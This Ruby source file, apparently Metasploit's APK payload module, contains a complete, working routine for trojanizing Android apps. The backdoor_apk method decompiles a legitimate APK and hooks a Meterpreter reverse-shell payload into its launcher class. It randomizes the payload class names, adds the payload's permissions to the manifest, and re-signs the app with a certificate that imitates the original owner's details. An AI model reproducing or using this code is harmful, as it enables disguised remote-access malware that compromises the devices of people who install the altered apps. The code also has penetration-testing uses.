# -*- coding: binary -*-

require 'rex/text'
require 'tmpdir'
require 'nokogiri'
require 'fileutils'
require 'optparse'
require 'open3'
require 'date'

class Msf::Payload::Apk

  def print_status(msg='')
    $stderr.puts "[*] #{msg}"
  end

  def print_error(msg='')
    $stderr.puts "[-] #{msg}"
  end

  alias_method :print_bad, :print_error

  def usage
    print_error "Usage: #{$0} -x [target.apk] [msfvenom options]\n"
    print_error "e.g. #{$0} -x messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443\n"
  end

  def run_cmd(cmd)
    begin
      stdin, stdout, stderr = Open3.popen3(*cmd)
      return stdout.read + stderr.read
    rescue Errno::ENOENT
      return nil
    end
  end

  # Find a suitable smali point to hook.
  # Returns the first suitable hook point.
  #
  # @param manifest [String] AndroidManifest.xml file contents
  #
  # @return [String] Full class name, for example: com.example.app.MainActivity
  def find_hook_point(manifest)
    return unless manifest

    package = manifest.xpath('//manifest').first['package']

    application = manifest.xpath('//application')
    application_name = application.attribute('name').to_s
    unless (application_name.blank? || application_name == 'android.app.Application')
      unless application_name.include?('.')
        application_name = '.' + application_name
      end
      if application_name.start_with?('.')
        application_name = package + application_name
      end
      return application_name
    end

    activities = manifest.xpath('//activity|//activity-alias')
    for activity in activities
      activity_name = activity.attribute('targetActivity').to_s
      if activity_name.blank?
        activity_name = activity.attribute('name').to_s
      end

      next if activity_name.blank?

      category = activity.search('category')
      next unless category

      for cat in category
        category_name = cat.attribute('name').to_s
        next unless (category_name == 'android.intent.category.LAUNCHER' || category_name == 'android.intent.action.MAIN')

        unless activity_name.include?('.')
          activity_name = '.' + activity_name
        end
        if activity_name.start_with?('.')
          activity_name = package + activity_name
        end

        return activity_name
      end
    end

    nil
  end

  # Read AndroidManifest.xml file.
  #
  # @param manifest_file [String] Path to AndroidManifest.xml file
  #
  # @return [Nokogiri::XML] AndroidManifest.xml file contents
  def parse_manifest(manifest_file)
    File.open(manifest_file, "rb"){|file|
      data = File.read(file)
      return Nokogiri::XML(data)
    }
  end

  def fix_manifest(tempdir, package, main_service, main_broadcast_receiver)
    #Load payload's manifest
    payload_manifest = parse_manifest("#{tempdir}/payload/AndroidManifest.xml")
    payload_permissions = payload_manifest.xpath("//manifest/uses-permission")

    #Load original apk's manifest
    original_manifest = parse_manifest("#{tempdir}/original/AndroidManifest.xml")
    original_permissions = original_manifest.xpath("//manifest/uses-permission")

    old_permissions = []
    add_permissions = []

    original_permissions.each do |permission|
      name = permission.attribute("name").to_s
      old_permissions << name
    end

    application = original_manifest.xpath('//manifest/application')
    payload_permissions.each do |permission|
      name = permission.attribute("name").to_s
      unless old_permissions.include?(name)
        add_permissions += [permission.to_xml]
      end
    end
    add_permissions.shuffle!
    for permission_xml in add_permissions
      print_status("Adding #{permission_xml}")
      if original_permissions.empty?
        application.before(permission_xml)
        original_permissions = original_manifest.xpath("//manifest/uses-permission")
      else
        original_permissions.before(permission_xml)
      end
    end

    application = original_manifest.at_xpath('/manifest/application')
    receiver = payload_manifest.at_xpath('/manifest/application/receiver')
    service = payload_manifest.at_xpath('/manifest/application/service')
    receiver.attributes["name"].value = package + '.' + main_broadcast_receiver
    receiver.attributes["label"].value = main_broadcast_receiver
    service.attributes["name"].value = package + '.' + main_service
    application << receiver.to_xml
    application << service.to_xml

    File.open("#{tempdir}/original/AndroidManifest.xml", "wb") { |file| file.puts original_manifest.to_xml }
  end

  def extract_cert_data_from_apk_file(path)
    orig_cert_data = []

    # extract signing scheme v1 (JAR signing) certificate
    # v1 signing is optional to support older versions of Android (pre Android 11)
    # https://source.android.com/security/apksigning/
    keytool_output = run_cmd(['keytool', '-J-Duser.language=en', '-printcert', '-jarfile', path])

    if keytool_output.include?('keytool error: ')
      raise RuntimeError, "keytool could not parse APK file: #{keytool_output}"
    end

    if keytool_output.start_with?('Not a signed jar file')
      # apk file does not have a valid v1 signing certificate
      # extract signing certificate from newer signing schemes (v2/v3/v4/...) using apksigner instead
      apksigner_output = run_cmd(['apksigner', 'verify', '--print-certs', path])

      cert_dname = apksigner_output.scan(/^Signer #\d+ certificate DN: (.+)$/).flatten.first.to_s.strip
      if cert_dname.blank?
        raise RuntimeError, "Could not extract signing certificate owner: #{apksigner_output}"
      end
      orig_cert_data.push(cert_dname)

      # Create random start date from some time in the past 3 years
      from_date = DateTime.now.next_day(-rand(3 * 365))
      orig_cert_data.push(from_date.strftime('%Y/%m/%d %T'))

      # Valid for 25 years
      # https://developer.android.com/studio/publish/app-signing
      to_date = from_date.next_year(25)
      validity = (to_date - from_date).to_i
      orig_cert_data.push(validity.to_s)
    else
      if keytool_output.include?('keytool error: ')
        raise RuntimeError, "keytool could not parse APK file: #{keytool_output}"
      end

      cert_dname = keytool_output.scan(/^Owner:(.+)$/).flatten.first.to_s.strip
      if cert_dname.blank?
        raise RuntimeError, "Could not extract signing certificate owner: #{keytool_output}"
      end
      orig_cert_data.push(cert_dname)

      valid_from_line = keytool_output.scan(/^Valid from:.+/).flatten.first
      if valid_from_line.empty?
        raise RuntimeError, "Could not extract certificate date: #{keytool_output}"
      end

      from_date_str = valid_from_line.gsub(/^Valid from:/, '').gsub(/until:.+/, '').strip
      to_date_str = valid_from_line.gsub(/^Valid from:.+until:/, '').strip
      from_date = DateTime.parse(from_date_str.to_s)
      orig_cert_data.push(from_date.strftime('%Y/%m/%d %T'))
      to_date = DateTime.parse(to_date_str.to_s)
      validity = (to_date - from_date).to_i
      orig_cert_data.push(validity.to_s)
    end

    if orig_cert_data.empty?
      raise RuntimeError, 'Could not extract signing certificate from APK file'
    end

    orig_cert_data
  end

  def check_apktool_output_for_exceptions(apktool_output)
    if apktool_output.to_s.include?('Exception in thread')
      print_error(apktool_output)
      raise RuntimeError, "apktool execution failed"
    end
  end

  def backdoor_apk(apkfile, raw_payload, signature = true, manifest = true, apk_data = nil, service = true)
    unless apk_data || apkfile && File.readable?(apkfile)
      usage
      raise RuntimeError, "Invalid template: #{apkfile}"
    end

    check_apktool = run_cmd(%w[apktool -version])
    if check_apktool.nil?
      raise RuntimeError, "apktool not found. If it's not in your PATH, please add it."
    end

    if check_apktool.to_s.include?('java: not found')
      raise RuntimeError, "java not found. If it's not in your PATH, please add it."
    end

    jar_name = 'apktool.jar'
    if check_apktool.to_s.include?("can't find #{jar_name}")
      raise RuntimeError, "#{jar_name} not found. This file must exist in the same directory as apktool."
    end

    check_apktool_output_for_exceptions(check_apktool)

    apktool_version = Rex::Version.new(check_apktool.split("\n").first.strip)
    min_required_apktool_version = Rex::Version.new('2.7.0')
    unless apktool_version >= min_required_apktool_version
      raise RuntimeError, "apktool version #{apktool_version} not supported, please download at least version #{min_required_apktool_version}."
    end

    #Create temporary directory where work will be done
    tempdir = Dir.mktmpdir
    File.binwrite("#{tempdir}/payload.apk", raw_payload)
    if apkfile
      FileUtils.cp apkfile, "#{tempdir}/original.apk"
    else
      File.binwrite("#{tempdir}/original.apk", apk_data)
    end

    if signature
      keytool = run_cmd(['keytool'])
      unless keytool != nil
        raise RuntimeError, "keytool not found. If it's not in your PATH, please add it."
      end

      apksigner = run_cmd(['apksigner'])
      if apksigner.nil?
        raise RuntimeError, "apksigner not found. If it's not in your PATH, please add it."
      end

      zipalign = run_cmd(['zipalign'])
      unless zipalign != nil
        raise RuntimeError, "zipalign not found. If it's not in your PATH, please add it."
      end

      keystore = "#{tempdir}/signing.keystore"
      storepass = "android"
      keypass = "android"
      keyalias = "signing.key"

      orig_cert_data = extract_cert_data_from_apk_file(apkfile)
      orig_cert_dname = orig_cert_data[0]
      orig_cert_startdate = orig_cert_data[1]
      orig_cert_validity = orig_cert_data[2]

      print_status "Creating signing key and keystore..\n"
      keytool_output = run_cmd([
        'keytool', '-genkey', '-v', '-keystore', keystore, '-alias', keyalias, '-storepass', storepass,
        '-keypass', keypass, '-keyalg', 'RSA', '-keysize', '2048', '-startdate', orig_cert_startdate,
        '-validity', orig_cert_validity, '-dname', orig_cert_dname
      ])

      if keytool_output.include?('keytool error: ')
        raise RuntimeError, "keytool could not generate key: #{keytool_output}"
      end
    end

    print_status "Decompiling original APK..\n"
    apktool_output = run_cmd(['apktool', 'd', "#{tempdir}/original.apk", '--only-main-classes', '-o', "#{tempdir}/original"])
    check_apktool_output_for_exceptions(apktool_output)

    print_status "Decompiling payload APK..\n"
    apktool_output = run_cmd(['apktool', 'd', "#{tempdir}/payload.apk", '-o', "#{tempdir}/payload"])
    check_apktool_output_for_exceptions(apktool_output)

    amanifest = parse_manifest("#{tempdir}/original/AndroidManifest.xml")

    print_status "Locating hook point..\n"
    hookable_class = find_hook_point(amanifest)
    if hookable_class.blank?
      raise 'Unable to find hookable class in AndroidManifest.xml'
    end

    hookable_class_filename = hookable_class.to_s.gsub('.', '/') + '.smali'
    hookable_class_filepath = "#{tempdir}/original/smali*/#{hookable_class_filename}"
    smalifile = Dir.glob(hookable_class_filepath).select { |f| File.readable?(f) && !File.symlink?(f) }.flatten.first
    if smalifile.blank?
      raise "Unable to find class file: #{hookable_class_filepath}"
    end

    hooksmali = File.binread(smalifile)
    entrypoint = 'return-void'
    unless hooksmali.include?(entrypoint)
      raise "Unable to find hookable function in #{smalifile}"
    end

    # Remove unused files
    FileUtils.rm "#{tempdir}/payload/smali/com/metasploit/stage/MainActivity.smali"
    FileUtils.rm Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/R*.smali")

    package = amanifest.xpath("//manifest").first['package']
    package = package.downcase + ".#{Rex::Text::rand_text_alpha_lower(5)}"
    classes = {}
    classes['Payload'] = Rex::Text::rand_text_alpha_lower(5).capitalize
    classes['MainService'] = Rex::Text::rand_text_alpha_lower(5).capitalize
    classes['MainBroadcastReceiver'] = Rex::Text::rand_text_alpha_lower(5).capitalize
    package_slash = package.gsub(/\./, "/")

    print_status "Adding payload as package #{package}\n"
    payload_files = Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/*.smali")
    payload_dir = "#{tempdir}/original/smali/#{package_slash}/"
    FileUtils.mkdir_p payload_dir

    # Copy over the payload files, fixing up the smali code
    payload_files.each do |file_name|
      smali = File.binread(file_name)
      smali_class = File.basename file_name
      for oldclass, newclass in classes
        if smali_class == "#{oldclass}.smali"
          smali_class = "#{newclass}.smali"
        end
        smali.gsub!(/com\/metasploit\/stage\/#{oldclass}/, package_slash + "/" + newclass)
      end
      smali.gsub!(/com\/metasploit\/stage/, package_slash)
      newfilename = "#{payload_dir}#{smali_class}"
      File.open(newfilename, "wb") {|file| file.puts smali }
    end

    if service
      hookfunction = "L#{package_slash}/#{classes['MainService']};->start()V"
    else
      hookfunction = "L#{package_slash}/#{classes['Payload']};->startContext()V"
    end

    payloadhook = %Q^invoke-static {}, #{hookfunction}
    ^ + entrypoint
    hookedsmali = hooksmali.sub(entrypoint, payloadhook)

    print_status "Loading #{smalifile} and injecting payload..\n"
    File.open(smalifile, "wb") {|file| file.puts hookedsmali }

    injected_apk = "#{tempdir}/output.apk"
    aligned_apk = "#{tempdir}/aligned.apk"
    if manifest
      print_status "Poisoning the manifest with meterpreter permissions..\n"
      fix_manifest(tempdir, package, classes['MainService'], classes['MainBroadcastReceiver'])
    end

    print_status "Rebuilding apk with meterpreter injection as #{injected_apk}\n"
    apktool_output = run_cmd(['apktool', 'b', '-o', injected_apk, "#{tempdir}/original"])
    check_apktool_output_for_exceptions(apktool_output)

    unless File.readable?(injected_apk)
      print_error apktool_output
      print_status("Unable to rebuild apk. Trying rebuild with AAPT2..\n")
      apktool_output = run_cmd(['apktool', 'b', '--use-aapt2', '-o', injected_apk, "#{tempdir}/original"])

      unless File.readable?(injected_apk)
        print_error apktool_output
        raise RuntimeError, "Unable to rebuild apk with apktool"
      end
    end

    if signature
      print_status "Aligning #{injected_apk}\n"
      zipalign_output = run_cmd(['zipalign', '-p', '4', injected_apk, aligned_apk])

      unless File.readable?(aligned_apk)
        print_error(zipalign_output)
        raise RuntimeError, 'Unable to align apk with zipalign.'
      end

      print_status "Signing #{aligned_apk} with apksigner\n"
      apksigner_output = run_cmd([
        'apksigner', 'sign', '--ks', keystore, '--ks-pass', "pass:#{storepass}", aligned_apk
      ])
      if apksigner_output.to_s.include?('Failed')
        print_error(apksigner_output)
        raise RuntimeError, 'Signing with apksigner failed.'
      end

      apksigner_verify = run_cmd(['apksigner', 'verify', '--verbose', aligned_apk])
      if apksigner_verify.to_s.include?('DOES NOT VERIFY')
        print_error(apksigner_verify)
        raise RuntimeError, 'Signature verification failed.'
      end
    else
      aligned_apk = injected_apk
    end

    outputapk = File.binread(aligned_apk)

    FileUtils.remove_entry tempdir
    outputapk
  end
end
